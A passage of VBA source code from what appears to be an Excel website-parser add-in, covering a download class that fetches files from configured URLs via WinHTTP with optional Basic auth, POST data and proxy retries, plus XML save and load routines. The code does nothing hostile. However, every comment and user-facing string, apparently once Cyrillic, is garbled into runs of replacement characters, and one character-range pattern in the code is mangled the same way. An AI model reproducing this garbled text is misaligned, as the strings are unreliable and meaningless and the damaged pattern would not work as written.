       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.Index & IIf(Me.Name = "", "", "  (" & Me.Name & ")"), "table-download"

    DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & Me.Index

    Me.Actions.ApplyTo txt$
    If StopMacro Then Exit Sub
    RowVariables.item("{d" & Me.Index & "link}") = txt$

    arr = Split(txt$, ARSEP)

    For i = LBound(arr) To UBound(arr)
        RowVariables.item("{item_index}") = i + 1

        DownloadURL$ = arr(i)

        If DownloadURL$ <> "" Then
            If IsURL(DownloadURL$) Then

                'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd|: " & CropURL(DownloadURL$)
                'SourceValue = Me.Parent.Parent.SourceValue
                RenderedFilename$ = FWF.Replace_symbols(RenderFilename(DownloadURL$, i), , True)
                FileName$ = GetDownloadFolderPath(True) & RenderedFilename$
                'Debug.Print i, filename$

                If DownloadURL$ Like "* *" Then DownloadURL$ = Replace(DownloadURL$, " ", "%20")
                If DownloadURL$ Like "*[|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then DownloadURL$ = ConvertURLtoPunycode(DownloadURL$)

                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                NewFolderPath$ = Left(FileName$, InStrRev(FileName$, "\"))
                If Not FolderExists(NewFolderPath$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    SHCreateDirectoryEx Application.Hwnd, NewFolderPath$, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                End If

                ' spi.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|: " & filename$
                ' Debug.Print "Download_filename$", filename$
                If SHOW_PI2 Then Me.Parent.Parent.PrInd2.StartNewAction , , , "|fffd||fffd||fffd||fffd||fffd||fffd|: " & CropURL(DownloadURL$), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|: " & RenderedFilename$

LabelStartDownload:
                If Me.NeedAuth Then
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    Me.Parent.Parent.WaitAPause

                    With http
                        .Open IIf(Me.POST_Enabled, "POST", "GET"), DownloadURL$, True
                        If Me.Parent.Parent.Options.UseClientCertificate Then .SetClientCertificate Me.Parent.Parent.Options.ClientCertificateName
                        Me.Parent.Parent.UpdateWinHttpProxySettings ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2019
                        .SetTimeouts 5000, 200000, 200000, 200000

                        .SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
                        .SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
                        AddRequestHeadersFromStore
                        If Not CookiesStore Is Nothing Then .SetRequestHeader "Cookie", GetCookiesFromStore

                        'If Me.BasicAuthEnabled Then .SetCredentials Me.BasicAuthLogin, Me.BasicAuthPassword, 0
                        If Me.BasicAuthEnabled Then .SetRequestHeader "Authorization", "Basic " & EncodeBase64(Me.BasicAuthLogin & ":" & Me.BasicAuthPassword)

                        If Me.POST_Enabled Then
                            PostData$ = Render(Me.POST_Data)
                            AddStandartHeadersIntoStore DownloadURL$, IIf(PostData$ Like "{*}", "application/json", "")           ' overwriting some old headers
                            .Send (PostData$)
                        Else
                            .Send
                        End If
                        DoEvents
                        Dim ResponseHeaders$, ResponseOK As Boolean

                        If Not .WaitForResponse(Timeout&) Then
                            ResponseOK = False
                        Else
                            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                            ResponseHeaders$ = .GetAllResponseHeaders
                            ResponseOK = Val(.Status) \ 100 = 2
                            If Len(Me.ResponseHeader_OK) Then ResponseOK = ResponseOK Or (ResponseHeaders$ Like "*" & Me.ResponseHeader_OK & "*")
                            If Len(Me.ResponseHeader_ERROR) Then ResponseOK = ResponseOK And Not (ResponseHeaders$ Like "*" & Me.ResponseHeader_ERROR & "*")
                        End If

                        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
                        'Debug.Print .GetAllResponseHeaders

                        If ResponseOK Then
                            res = True
                            Set oStream = CreateObject("ADODB.Stream")
                            oStream.Open
                            oStream.Type = 1
                            oStream.Write .ResponseBody
                            oStream.SaveToFile FileName$, 2        ' 1 = no overwrite, 2 = overwrite
                            oStream.Close
                            ParserVariables.item("{d" & Me.Index & "filename}") = FileName$
                            'Debug.Print "Downloading file with auth done: Len = " & Len(.ResponseText)

                            ResponseText$ = .ResponseText
                            With Me.Parent.Parent.Proxy
                                If .Enabled Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FailMask
                                    If Len(.Check_FailMask) Then
                                        For Each v In Split(Render(.Check_FailMask), "|")
                                            If Len(Trim(v)) Then If ResponseText$ Like "*" & Trim(v) & "*" Then res = False: Exit For
                                        Next
                                    End If
                                End If
                            End With
                            ResponseText$ = ""

                        Else
                            Debug.Print "error downloading file using WinHTTP: Status = " & .Status
                            'ShowText .ResponseText
                        End If
                        'ShowText .GetAllResponseHeaders
                    End With
                Else
                    res = DownloadFile_FromURL(DownloadURL$, FileName$, Not Me.Parent.Parent.Options.UseFileCache)
                    'Debug.Print res, "filename$ = " & filename$
                End If


                If res Then
                    nOK = nOK + 1

                    If DESCRIPTION_MODE_FOR_ITEM Then
                        PublishHTML_ShowDownload DownloadURL$, Dir(FileName$, vbNormal), _
                                                 Replace(NewFolderPath$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$), Me
                    End If
                Else
                    If SHOW_PI2 Then Me.Parent.Parent.PrInd2.Log "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & DownloadURL$
                    'If Me.Parent.Parent.Options.ShowErrors Then AddBalloon "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & DownloadURL$, bt_Warning

                    If Me.IgnoreErrors Then
                        Debug.Print "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & DownloadURL$
                        Debug.Print "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & FileName$ & vbNewLine
                    Else

                        If Me.Parent.Parent.Proxy.Enabled Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

                            With Me.Parent.Parent.Proxy
                                ProxyAddressBefore$ = "": ProxyAddressAfter$ = "": ProxyAddressBefore$ = .ActiveProxy.Address
                                .UpdateActiveProxyInfo False    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                                ProxyAddressAfter$ = .ActiveProxy.Address

                                If ProxyAttemptsCount& <= .Attempts Then
                                    ProxyAttemptsCount& = ProxyAttemptsCount& + 1
                                    AddBalloon "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Timeout& & " |fffd||fffd||fffd|.) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & DownloadURL$ & "'>" & _
                                               CropURL(DownloadURL$, 30) & "</a>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                                               IIf(ProxyAddressBefore$ = ProxyAddressAfter$, "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</b>", _
                                                   "<b>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|:</b> " & ProxyAddressBefore$ & " -> " & ProxyAddressAfter$ & ""), bt_Attention
                                    GoTo LabelStartDownload
                                Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & .Attempts & _
                                               ") |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & DownloadURL$ & "'>" & CropURL(DownloadURL$, 30) & "</a>", bt_Warning

                                End If
                            End With

                        Else    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                            Select Case Me.Parent.Parent.SetError("|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: !URL" & vbNewLine & _
                                                                                             "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & FileName$, DownloadURL$, True, RetryCount&)
                                Case vbIgnore        ' do nothing
                                Case vbAbort: StopMacro = True
                                Case vbRetry:
                                    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RetryCount&, DownloadURL$
                                    Debug.Print "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|: " & FileName$
                                    Timeout& = Timeout& + 3: GoTo LabelStartDownload
                            End Select
                        End If
                    End If
                    nERR = nERR + 1
                End If

            Else    ' if not isURL(DownloadURL$)
                If SHOW_PI2 Then Me.Parent.Parent.PrInd2.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & DownloadURL$
                If Me.Parent.Parent.Options.ShowErrors Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & DownloadURL$, bt_Warning
            End If

        End If    ' if DownloadURL$<>""
        DoEvents
    Next i

    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
End Sub

Function RenderFilename(ByVal DownloadURL$, Optional ByVal array_index& = 0) As String
    On Error Resume Next
    Dim FileName$, col&, i&, objMatches As Object
    Select Case Me.FilenameMode
        Case dfm_Auto
            FileName$ = GetFilenameFromURL(DownloadURL$)
        Case dfm_UseMask
            FileName$ = Me.FilenameMask
    End Select
    If FileName$ = "" Then FileName$ = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| {row}"

    RenderFilename = Render(FileName$)

    If InStr(1, RenderFilename, ARSEP) Then RenderFilename = Split(RenderFilename, ARSEP)(array_index&)

    For i = 1 To 10
        If Left(RenderFilename, 1) = "\" Then RenderFilename = Mid(RenderFilename, 2)
    Next
End Function

Function GetDownloadFolderPath(Optional CreateIfNotExist As Boolean = True, Optional ToOpen As Boolean)
    On Error Resume Next: Dim MainPath$

    MainPath$ = Replace(Me.Folder, ROOT_FOLDER_PREFIX$, "")
    If ToOpen Then
        If MainPath$ Like "*\%*%*" Then MainPath$ = Split(MainPath$, "\%")(0) & "\"
    End If

    GetDownloadFolderPath = Render(MainPath$)
    If Right(GetDownloadFolderPath, 1) <> "\" Then GetDownloadFolderPath = GetDownloadFolderPath & "\"

    If (GetDownloadFolderPath Like "\[!\]*") Or (GetDownloadFolderPath = "\") Then
        GetDownloadFolderPath = ThisWorkbook.Path & GetDownloadFolderPath
    End If

    If CreateIfNotExist Then
        If Not FolderExists(GetDownloadFolderPath) Then
            Err.Clear
            SHCreateDirectoryEx Application.Hwnd, GetDownloadFolderPath, ByVal 0&        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            If Err Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: |fffd|" & Me.Folder & "|fffd|", vbExclamation
        End If
    End If
End Function


Function MoveUp() As ParserDownload
    On Error Resume Next
    If Me.Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveUp": Exit Function
    If Me.Index <= 1 Then Set MoveUp = Me: Exit Function

    Set MoveUp = Me
    Err.Clear: Me.Parent.Items.Add MoveUp, , Me.Index - 1
    If Err = 0 Then Me.Parent.DeleteItem Me.Index + 1
End Function

Function MoveDown() As ParserDownload
    On Error Resume Next
    If Me.Parent Is Nothing Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| MoveDown": Exit Function
    If Me.Parent.Items.Count <= Me.Index Then Set MoveDown = Me: Exit Function

    Me.Parent.GetItemByIndex(Me.Index + 1).MoveUp        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set MoveDown = Me.Parent.GetItemByIndex(Me.Index)
End Function


Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement
    Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(XML.createElement(XML_NODE_NAME$))
        With node
            .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
            .Attributes.setNamedItem(XML.createAttribute("Index")).text = Me.Index
            .Attributes.setNamedItem(XML.createAttribute("Name")).text = Me.Name
            .Attributes.setNamedItem(XML.createAttribute("NeedAuth")).text = Abs(CInt(Me.NeedAuth))
            .Attributes.setNamedItem(XML.createAttribute("IgnoreErrors")).text = Abs(CInt(Me.IgnoreErrors))
            .Attributes.setNamedItem(XML.createAttribute("OpenFolderOnFinish")).text = Abs(CInt(Me.OpenFolderOnFinish))

            If Me.BasicAuthEnabled Or (Me.BasicAuthLogin <> "") Or (Me.BasicAuthPassword <> "") Then
                With .appendChild(XML.createElement("BasicAuth"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.BasicAuthEnabled))
                    .Attributes.setNamedItem(XML.createAttribute("Login")).text = Me.BasicAuthLogin
                    .Attributes.setNamedItem(XML.createAttribute("Password")).text = Me.BasicAuthPassword
                End With
            End If
            If Me.POST_Enabled Or (Me.POST_Data <> "") Then
                With .appendChild(XML.createElement("POST"))
                    .Attributes.setNamedItem(XML.createAttribute("Enabled")).text = Abs(CInt(Me.POST_Enabled))
                    .Attributes.setNamedItem(XML.createAttribute("Data")).text = Me.POST_Data
                End With
            End If
            If (Me.ResponseHeader_OK <> "") Or (Me.ResponseHeader_ERROR <> "") Then
                With .appendChild(XML.createElement("ResponseHeader"))
                    .Attributes.setNamedItem(XML.createAttribute("OK")).text = Me.ResponseHeader_OK
                    .Attributes.setNamedItem(XML.createAttribute("Error")).text = Me.ResponseHeader_ERROR
                End With
            End If

            If Me.Actions.Items.Count Then .appendChild Me.Actions.ExportToXML

            With .appendChild(XML.createElement("SaveOptions"))
                .Attributes.setNamedItem(XML.createAttribute("FilenameMode")).text = Me.FilenameMode
                .Attributes.setNamedItem(XML.createAttribute("FilenameMask")).text = Me.FilenameMask

                If Me.Folder = "" Then Me.Folder = "\Downloads\"
                If Right(Me.Folder, 1) <> "\" Then Me.Folder = Me.Folder & "\"
                .Attributes.setNamedItem(XML.createAttribute("Folder")).text = Me.Folder
            End With
        End With
    End With
    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If node Is Nothing Then Exit Sub
    If node.BaseName <> XML_NODE_NAME$ Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
        Exit Sub
    End If

    With node
        Me.Enabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
        Me.Index = Val(.Attributes.getNamedItem("Index").text)
        Me.Name = .Attributes.getNamedItem("Name").text
        Me.NeedAuth = CBool(Val(.Attributes.getNamedItem("NeedAuth").text))
        Me.IgnoreErrors = CBool(Val(.Attributes.getNamedItem("IgnoreErrors").text))
        Me.OpenFolderOnFinish = CBool(Val(.Attributes.getNamedItem("OpenFolderOnFinish").text))

        With .SelectSingleNode("BasicAuth")
            Me.BasicAuthEnabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.BasicAuthLogin = .Attributes.getNamedItem("Login").text
            Me.BasicAuthPassword = .Attributes.getNamedItem("Password").text
        End With
        With .SelectSingleNode("POST")
            Me.POST_Enabled = CBool(Val(.Attributes.getNamedItem("Enabled").text))
            Me.POST_Data = .Attributes.getNamedItem("Data").text
        End With

        With .SelectSingleNode("ResponseHeader")
            Me.ResponseHeader_OK = .Attributes.getNamedItem("OK").text
            Me.ResponseHeader_ERROR = .Attributes.getNamedItem("Error").text
        End With

        Set Me.Actions = New ArrayActions
        Set Me.Actions.ParentParser = Me.Parent.Parent
        Me.Actions.LoadFromXML .SelectSingleNode("Actions")

        With .SelectSingleNode("SaveOptions")
            Me.FilenameMode = Val(.Attributes.getNamedItem("FilenameMode").text)
            Me.FilenameMask = .Attributes.getNamedItem("FilenameMask").text
            Me.Folder = .Attributes.getNamedItem("Folder").text
        End With
    End With
    If Me.Folder = "" Then Me.Folder = "\Downloads\"
    If Right(Me.Folder, 1) <> "\" Then Me.Folder = Me.Folder & "\"
End Sub

Attribute VB_Name = "ParserDownloads"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : ParserDownloads
' Author        : Igor Vakhnenko            Date: 12.11.2013
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text
Option Explicit

Const XML_NODE_NAME$ = "Downloads", XML_SUBNODE_NAME$ = "Download"
Public Parent As WebsiteParser

Public Actions As New ArrayActions

Public Items As New Collection
Public Enabled As Boolean

Public nOK As Long, nERR As Long        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Private Sub Class_Terminate()
    Set Items = Nothing
    Set Actions = Nothing
    Set Parent = Nothing
End Sub

Sub OpenDownloadFolders()
    On Error Resume Next
    Dim PD As ParserDownload
    For Each PD In Me.Items
        If PD.Enabled And PD.OpenFolderOnFinish Then
            FWF.OpenFolder PD.GetDownloadFolderPath(, True)
        End If
    Next PD
End Sub

Sub ExecuteAll(ByVal txt$)
    On Error Resume Next
    If Not Me.Enabled Then Exit Sub
    If StopMacro Then Exit Sub
    If SHOW_PI2 Then Me.Parent.PrInd2.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."
    DoEvents


    If DESCRIPTION_MODE_FOR_ITEM Then
        PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd|", "table-download-main", True

        PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & "<br />" & _
                                     "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", txt$

        PublishHTML_StartNewTable "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "table-downloads"
    End If

    DEBUG_LevelInfo$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    Me.Actions.ApplyTo txt$

    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
    If StopMacro Then Exit Sub

    PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & "<br />" & _
                                 "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", txt$

    Dim PD As ParserDownload
    For Each PD In Me.Items
        If PD.Enabled Then PD.Execute txt$
        If StopMacro Then Exit Sub
    Next PD

    If DESCRIPTION_MODE_FOR_ITEM Then PublishHTML_CloseTable
End Sub

Function GetItemByName(ByVal DownloadName$) As ParserDownload
    On Error Resume Next: Dim PD As ParserDownload, txt$
    For Each PD In Me.Items
        If PD.Name = DownloadName$ Then Set GetItemByName = PD: Exit Function
    Next PD
End Function

Function GetItemByIndex(ByVal Index&) As ParserDownload
    On Error Resume Next: Set GetItemByIndex = Me.Items.item(Index&)
End Function
Function DeleteItem(ByVal Index&) As Boolean
    On Error Resume Next: Err.Clear
    Me.Items.Remove Index&
    Me.UpdateIndexes
End Function
Sub UpdateIndexes()
    Dim i&: For i = 1 To Items.Count: Items(i).Index = i: Next
End Sub

Function Add() As ParserDownload
    On Error Resume Next
    Set Add = New ParserDownload
    With Add
        Me.UpdateIndexes
        .Index = Me.Items.Count + 1
        Set .Parent = Me
        Set .Actions.ParentParser = Me.Parent
    End With
    Me.Items.Add Add
End Function

Function ToArray() As Variant
    On Error Resume Next
    If Me.Items.Count = 0 Then ToArray = Array(): Exit Function
    Dim n As Long, i&
    ReDim arr(0 To Items.Count - 1, 0 To 1)
    For i = 0 To Items.Count - 1
        With Items(i + 1)
            If .Enabled Then
                arr(n, 0) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & .Index
            Else
                arr(n, 0) = .Index & " <|fffd||fffd||fffd||fffd|.>"
            End If
            arr(n, 1) = .Name
        End With
        n = n + 1
    Next i
    ToArray = arr
End Function

Function ExportToXML(Optional ByVal SaveDisabledActions As Boolean = False) As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument, node As IXMLDOMElement, PD As ParserDownload
    Set XML = CreateObject("Microsoft.XMLDOM")

    With XML
        .preserveWhiteSpace = True
        Set node = .appendChild(.createElement(XML_NODE_NAME$))
        node.Attributes.setNamedItem(.createAttribute("Enabled")).text = Abs(CInt(Me.Enabled))
        node.Attributes.setNamedItem(.createAttribute("Version")).text = 1
        If Me.Actions.Items.Count Then node.appendChild Me.Actions.ExportToXML

        For Each PD In Me.Items
            node.appendChild PD.ExportToXML
        Next PD
    End With

    Set ExportToXML = node
End Function

Sub LoadFromXML(ByVal node As IXMLDOMElement)
    On Error Resume Next
    If Not node Is Nothing Then
        If node.BaseName <> XML_NODE_NAME$ Then
            MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| XML", vbCritical, "node.baseName <> |fffd|" & XML_NODE_NAME$ & "|fffd|"
            Exit Sub
        End If

        Me.Enabled = CBool(Val(node.Attributes.getNamedItem("Enabled").text))
        Set Me.Actions = New ArrayActions
        Set Me.Actions.ParentParser = Me.Parent
        Me.Actions.LoadFromXML node.SelectSingleNode("Actions")

        Dim subnode As IXMLDOMElement, PD As ParserDownload
        Set Me.Items = New Collection

        For Each subnode In node.SelectNodes(XML_SUBNODE_NAME$)
